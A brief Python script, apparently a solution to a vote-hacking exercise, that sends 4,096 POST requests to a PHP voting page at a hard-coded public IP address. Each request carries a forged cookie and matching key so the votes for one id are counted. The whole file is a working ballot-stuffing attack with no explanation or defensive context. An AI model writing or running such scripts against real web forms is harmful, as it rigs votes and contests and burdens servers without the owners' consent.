#!/usr/bin/python3
import requests

url = 'http://158.69.76.135/level1.php'

values = {'id': '377', 'holdthedoor': 'Submit', 'key': 'somecookie'}

cookie = dict(HoldTheDoor='somecookie')

for i in range(4096):
    r = requests.post(url, data=values, cookies=cookie)

print(r.status_code, r.reason)
